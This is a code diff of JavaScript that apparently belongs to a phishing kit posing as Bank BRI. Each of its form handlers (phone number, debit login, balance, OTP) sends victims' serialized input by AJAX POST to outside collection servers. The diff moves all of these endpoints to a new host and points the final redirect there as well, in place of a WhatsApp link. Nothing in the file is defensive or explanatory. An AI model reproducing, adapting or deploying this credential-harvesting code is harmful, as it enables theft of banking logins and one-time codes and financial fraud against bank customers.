@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-ud5fcc/no.php',
+        url: 'https://anjayhostjon.cloud/bri/v1-ud5fcc/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-ud5fcc/login.php',
+        url: 'https://anjayhostjon.cloud/bri/v1-ud5fcc/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-ud5fcc/saldo.php',
+        url: 'https://anjayhostjon.cloud/bri/v1-ud5fcc/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/v1-ud5fcc/otp.php',
+        url: 'https://anjayhostjon.cloud/bri/v1-ud5fcc/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
@@ -127,7 +127,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/6282183616116?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+location.href='https://anjayhostjon.cloud/wa/v1-ud5fcc';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
